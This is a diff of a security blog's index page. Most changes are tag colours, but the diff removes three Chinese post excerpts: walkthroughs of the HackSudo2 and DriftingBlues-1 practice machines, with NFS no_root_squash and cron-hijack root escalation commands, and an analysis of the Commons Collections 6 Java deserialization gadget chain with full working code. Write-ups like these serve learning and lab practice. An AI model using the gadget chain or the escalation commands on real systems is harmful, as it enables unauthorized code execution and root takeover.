-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
         </span>
         
         <span class="tag">
@@ -941,7 +2116,7 @@ public class CC3 &#123;
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
         </span>
         
         <span class="tag">
@@ -951,7 +2126,7 @@ public class CC3 &#123;
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #00bcd4">java</a>
+            <a href="/tags/java/" style="color: #03a9f4">java</a>
         </span>
         
     </div>
@@ -1001,12 +2176,12 @@ public class CC3 &#123;
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
         </span>
         
     </div>
@@ -1332,278 +2507,16 @@ if(!isset($_GET[&#39;file&#39;])) &#123;
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
-        </span>
-        
-    </div>
-    <a href="/2023/08/02/NSS%E5%88%B7web3/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/08/01/HackSudo2%E9%9D%B6%E6%9C%BA%20%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
-        <h2 class="post-title">HackSudo2靶机 通关详解</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/8/1
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>发现vmWare的kali扫不到virtualbox的靶机<br>网上找了挺久资料都没解决 索性全桥接上物理机了</p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/c9ce06a03da44d0198f537a51030da47.png" alt="在这里插入图片描述"></p>
-<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>扫个目录<br><img src="https://img-blog.csdnimg.cn/1d7f63201a9f496e957ddf4cdf48493b.png" alt="在这里插入图片描述"><br>都看了一眼 没什么有用的<br>然后回到file.php</p>
-<p>感觉之前做过类似的靶场,猜测存在文件包含<br>随便传个file试试<br><img src="https://img-blog.csdnimg.cn/6267918e996f45168c304a3099093e9a.png" alt="在这里插入图片描述"></p>
-<p>确实有 考虑日志文件包含<br>之前看phpinfo的时候知道是apache<br>试了试没成功<br>且phpinfo中说了不允许远程包含<br><img src="https://img-blog.csdnimg.cn/52321fc0e68b484cb9608951817b5041.png" alt="在这里插入图片描述"><br>web上我暂时想不到什么突破口了<br>把读到的passwd放到user.txt中<br>看看能不能ssh爆破一下<br><img src="https://img-blog.csdnimg.cn/1851e615c40c48fe9b0314996536553b.png" alt="在这里插入图片描述"><br>这里试试登hacksudo<br>也没爆出来 回头看看还有那些服务<br>还有nfs<br>那应该突破口就是nfs了<br><img src="https://img-blog.csdnimg.cn/85683f9acd984f2e85ba547733782818.png" alt="在这里插入图片描述"></p>
-<p>然后去读nfs的配置信息<br><img src="https://img-blog.csdnimg.cn/aa02dec3f3d64eb7af74ac2f84874413.png" alt="在这里插入图片描述"><br>有写权限 且发现是<code>no_root_squash</code>的<br><code>no_root_squash</code>：允许客户端以root用户访问，root用户具有根目录的完全控制访问权限</p>
-<p>直接写shell<br><img src="https://img-blog.csdnimg.cn/dc89a617e5bf4a36818d360e06333fb0.png" alt="在这里插入图片描述"></p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>优化一下shell<br><code>/usr/bin/script -qc /bin/bash /dev/null</code><br><code>ctrl+z</code><br><code>stty raw -echo;fg</code></p>
-<p>然后在kali上复制个bash进&#x2F;mnt<br>由于no_root_squash 我们在挂载目录中是root权限<br><img src="https://img-blog.csdnimg.cn/8658bbfd5244458d8b92fe8fa8e6df3d.png" alt="在这里插入图片描述"><br><code>./bash -p</code><br><img src="https://img-blog.csdnimg.cn/bba45cd147f44a6fac696f5acc66f828.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7f15a9b926894f159c666d96c288eb46.png" alt="在这里插入图片描述"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
-        </span>
-        
-    </div>
-    <a href="/2023/08/01/HackSudo2%E9%9D%B6%E6%9C%BA%20%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/07/30/CommonCollections6%E9%93%BE%E5%88%86%E6%9E%90/">
-        <h2 class="post-title">CommonCollections6链分析</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/7/30
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>前面和CC1一样<br>优点是不限制jdk版本和cc的版本</p>
-<p>先开一个<code>ChainedTransformer</code><br><img src="https://img-blog.csdnimg.cn/742f4fb0ceb143e9a7f2936f418ed278.png" alt="在这里插入图片描述"><br>然后创<code>LazyMap</code> 我们顺便执行一下避免上面写错<br><img src="https://img-blog.csdnimg.cn/3648efc3e819457db79e3214a15e9769.png" alt="在这里插入图片描述"><br>能弹计算器 没问题<br>后面就是CC6不同的地方了</p>
-<p>我们需要一个<code>TiedMapEntry</code><br>因为需要一个类调用了get方法<br>在<code>TiedMapEntry</code>的<code>getValue()</code>方法中调用了<code>get() </code>其中<code>map</code>和<code>key</code>都可控<br><img src="https://img-blog.csdnimg.cn/29ed92d267d343c5820511e1f1b17145.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/efa2a12eeaa247c989a419346e807c18.png" alt="在这里插入图片描述"><br>那么我们就需要一个类调用<code>getValue</code>方法 TiedMapEntry的hashCode方法就可以<br><img src="https://img-blog.csdnimg.cn/a95a621fed834b718b8e3733845b9cfc.png" alt="在这里插入图片描述"></p>
-<p>然后类似URLDNS的链子 我们可以知道这里可以用<code>HashMap</code>连上<br><code>HashMap</code>的<code>readObject</code>方法会调用<code>hashCode</code><br><img src="https://img-blog.csdnimg.cn/cdfc39954c9c40f3838874a228a3960f.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/cd6a4dd4898c4c2e95d355282d195346.png" alt="在这里插入图片描述"><br>至此链子结束 我们可以写出如下代码</p>
-<pre><code class="java">package org.example.CC6;
-
-
-import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.LazyMap;
-
-import java.io.*;
-import java.lang.reflect.Field;
-import java.util.HashMap;
-import java.util.Map;
-
-public class Main &#123;
-    public static   void main(String[] args) throws ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException &#123;
-        Transformer[] transformers = new Transformer[]&#123;
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
-                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),
-                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
-        &#125;;
-        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
-
-        Map map = new HashMap();
-        Map lazyMap = LazyMap.decorate(map,chainedTransformer);
-        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;xxx&quot;);
-        Map map2 = new HashMap();
-        map2.put(tiedMapEntry,&quot;ccc&quot;);
-        serialize(map2);
-        unSerialize(&quot;ser.bin&quot;);
-
-
-    &#125;
-
-    public static void serialize(Object obj) throws IOException &#123;
-        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
-        oos.writeObject(obj);
-    &#125;
-    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
-        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
-        return ois.readObject();
-    &#125;
-&#125;
-</code></pre>
-<p>尝试执行 发现确实能弹计算器<br>但是这里存在和URLDNS一样的问题 , 就是这个计算器弹的时机是在<code>map2.put</code>的时候<br>而不是我们期望的反序列化的时候</p>
-<p>原因是HashMap在put的时候已经给整条链走完了<br><img src="https://img-blog.csdnimg.cn/a45f2a63880c4fdd90294707baa6e941.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/fcea8304eb2c4ecc86d53e572f68923b.png" alt="在这里插入图片描述"><br>因为这里的key !&#x3D; null 所以继续进了hashCode<br><img src="https://img-blog.csdnimg.cn/c2d83b6ada7d40d7add8bbbfb16257ac.png" alt="在这里插入图片描述"><br>LazyMap调用get<br><img src="https://img-blog.csdnimg.cn/db9bcf8b2d5240efb99a9c6adaa8ba27.png" alt="在这里插入图片描述"><br>然后没有<code>key</code> <code>put</code>进去了 在后面反序列化的时候就有<code>key</code>了<br>有<code>key</code>就直接<code>return map.get(key)</code>了</p>
-<p>为了避免这种情况 我们需要 让最开始传入的东西不能形成链子 就是说改LazyMap 改 TiedMapEntry 之类的的都行,只要不在反序列化前弹计算器就行<br>然后要记得给put进来的key remove掉<br>于是最终代码如下</p>
-<pre><code class="java">package org.example.CC6;
-
-
-import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.keyvalue.TiedMapEntry;
-import org.apache.commons.collections.map.LazyMap;
-
-import java.io.*;
-import java.lang.reflect.Field;
-import java.util.HashMap;
-import java.util.Map;
-
-public class Main &#123;
-    public static   void main(String[] args) throws ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException &#123;
-        Transformer[] transformers = new Transformer[]&#123;
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
-                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
-                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
-        &#125;;
-        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
-
-        Map map = new HashMap();
-        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
-        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;xxx&quot;);
-        Map map2 = new HashMap();
-        map2.put(tiedMapEntry, &quot;ccc&quot;);
-        lazyMap.remove(&quot;xxx&quot;);
-        Field field = LazyMap.class.getDeclaredField(&quot;factory&quot;);
-        field.setAccessible(true);
-        field.set(lazyMap, chainedTransformer);
-
-        serialize(map2);
-        unSerialize(&quot;ser.bin&quot;);
-    &#125;
-
-
-
-    public static void serialize(Object obj) throws IOException &#123;
-        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
-        oos.writeObject(obj);
-    &#125;
-    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
-        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
-        return ois.readObject();
-    &#125;
-&#125;
-</code></pre>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
             <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #03a9f4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/java/" style="color: #ff7d73">java</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
         </span>
         
     </div>
-    <a href="/2023/07/30/CommonCollections6%E9%93%BE%E5%88%86%E6%9E%90/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2023/07/30/DRIFTINGBLUES-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
-        <h2 class="post-title">DRIFTINGBLUES-1靶机通关详解</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2023/7/30
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/bdba99ff6ab34b9abe568ec00a1cda10.png" alt="在这里插入图片描述"></p>
-<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>进web看源码发现 <img src="https://img-blog.csdnimg.cn/cc2e0d34c93c412498c03d013c551c53.png" alt="在这里插入图片描述"><br>解码得到 <code>/noteforkingfish.txt</code><br>访问发现是ook 解得<br><img src="https://img-blog.csdnimg.cn/283ce3edb77b4aff85b34c20d503ceab.png" alt="在这里插入图片描述"><br>先把这个名字记下来 说不定之后要ssh爆破有用<br>然后他说要用 host file <img src="https://img-blog.csdnimg.cn/00de8faccf31481e90dfaf4f8b976f1b.png" alt="在这里插入图片描述"><br>注意到域名可能是<code>driftingblues.box</code><br>加到hosts里试试<br>没啥用 看别人wp知道还得爆破子域名 那kali也添加个hosts然后爆破子域名<br><img src="https://img-blog.csdnimg.cn/f223ade9342140e69f9c14237ef4c260.png" alt="在这里插入图片描述"></p>
-<p>所以添加<code>test.driftingblues.box</code>进去 然后访问<br><img src="https://img-blog.csdnimg.cn/9577716640c447129dc31630217c95bb.png" alt="在这里插入图片描述"><br>扫个目录<br><img src="https://img-blog.csdnimg.cn/684704a72e26485c8e8f7a5832c4a353.png" alt="在这里插入图片描述"><br><code>robots.txt</code>中有<code>ssh_cred.txt</code><br><img src="https://img-blog.csdnimg.cn/090746838644466abdc249afcb0c0d01.png" alt="在这里插入图片描述"><br>说密码最后要加一位数字<br><img src="https://img-blog.csdnimg.cn/65dcb046a9a34f8ab467c7b416a8b2ce.png" alt="在这里插入图片描述"><br>登录上去</p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="https://img-blog.csdnimg.cn/909dce890c9840a99c9b95fd56507631.png" alt="在这里插入图片描述"><br>看看有哪些可能有用的账户 <img src="https://img-blog.csdnimg.cn/90b1d163dbd34d3780c84630ffed7623.png" alt="在这里插入图片描述"><br>进<code>home</code>目录 发现没有db用户<br>那再看看eric有没有sudo权限<br><img src="https://img-blog.csdnimg.cn/8322dacb5c394f30af00a1b645c7ce9a.png" alt="在这里插入图片描述"><br>去&#x2F;tmp看看有没有什么临时文件<br><img src="https://img-blog.csdnimg.cn/3cc271c7c50a4d5f8e52429174ba9171.png" alt="在这里插入图片描述"><br>有备份 去&#x2F;var&#x2F;backups看看</p>
-<p><img src="https://img-blog.csdnimg.cn/8b05a202f5ac491293e8c3484649fbc9.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bbcabdc2252e493db134115ff419d787.png" alt="在这里插入图片描述"><br>去tmp下看emergency文件 发现没有<br>那么我们可以自己创一个利用<br>手动执行backup.sh 提示没权限<br><img src="https://img-blog.csdnimg.cn/ab1554d084114415b7709d4e0ccf800e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/192a81b6bf7b4e2ba4b61405570fc767.png" alt="在这里插入图片描述"><br>发现其实他自己隔一段时间会自动执行backup.sh<br>那么等一会就行</p>
-<pre><code class="bash">echo &quot;cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash&quot; &gt; emergency
-chmod +x emergency
-</code></pre>
-<p>等rootbash创建了之后 </p>
-<pre><code class="bash">./rootbash -p
-</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/05d611f5bc9a46da9ee2652324ba14bb.png" alt="在这里插入图片描述"></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
-        </span>
-        
-    </div>
-    <a href="/2023/07/30/DRIFTINGBLUES-1%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
+    <a href="/2023/08/02/NSS%E5%88%B7web3/" class="go-post">阅读全文</a>
 </div>
 
 
@@ -1659,7 +2572,7 @@ chmod +x emergency
     <div id="footer-wrap">
         <div>
             &copy;
-            2022 - 2024 Arcueid&#39;s BLOG
+            2022 - 2025 Arcueid&#39;s BLOG
             <span id="footer-icon">
                 <i class="fa-solid fa-font-awesome fa-fw"></i>
             </span>
